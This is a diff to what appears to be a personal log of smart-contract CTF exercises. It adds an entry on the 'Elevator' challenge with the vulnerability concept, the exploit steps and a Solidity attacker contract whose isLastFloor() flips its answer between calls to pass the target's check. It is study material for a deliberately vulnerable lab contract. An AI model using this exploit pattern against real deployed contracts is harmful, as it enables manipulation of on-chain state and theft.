@@ -336,4 +336,43 @@ contract ReentrancyAttack {
 ```
 ---
 
+### 11.Elevator
+
+
+Vulnerability Concept:
+Inconsistent return values from an external contract are trusted without validation, leading to faulty logic in critical state changes.
+
+Exploit Mechanism:
+The main contract relies on an external `isLastFloor()` response. Since there's no restriction on returning different values across calls, we manipulate the response to pass logic checks.
+
+Real-World Example:
+This mimics poor use of untrusted data in external calls — e.g., when dApps rely on oracles, bridges, or adapters that may return inconsistent or malicious responses.
+
+My Attack Summary (in 2–3 steps):
+1. Built a contract that flips a boolean on each `isLastFloor()` call.
+2. First call returns `false`, second returns `true`, allowing state change.
+3. Called `goTo()` from the attacker contract to reach the top floor.
+
+Solidity Snippet I Learned:
+```solidity
+contract AttackElevator {
+    Elevator public elevator;
+    bool public flag = true;
+
+    constructor(address _elevator) {
+        elevator = Elevator(_elevator);
+    }
+
+    function isLastFloor(uint256) external returns (bool) {
+        flag = !flag;
+        return flag;
+    }
+
+    function attack() public {
+        elevator.goTo(21);
+    }
+}
+```
+---
+
 ---
